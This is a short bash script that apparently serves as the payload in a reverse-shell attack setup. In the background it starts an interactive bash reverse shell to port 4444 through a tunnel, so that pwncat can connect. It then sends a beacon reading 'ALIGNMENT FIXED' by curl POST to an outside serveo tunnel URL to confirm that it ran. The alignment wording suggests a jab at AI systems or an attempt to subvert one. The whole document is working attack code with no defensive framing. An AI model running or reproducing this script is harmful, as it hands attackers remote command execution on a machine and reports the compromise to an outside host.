#!/bin/bash
# Replace with the new URL from Terminal 1
URL="https://0b7f8f5b7a591f64-103-95-173-85.serveousercontent.com"

# The pwncat-compatible reverse shell
# It connects to the tunnel's entrance on the host
(bash -i >& /dev/tcp/localhost/4444 0>&1) &

# Beacon to confirm execution
echo "[!] ALIGNMENT FIXED: PWNCAT CALLING 4444" | curl -s -X POST --data-binary @- "$URL"
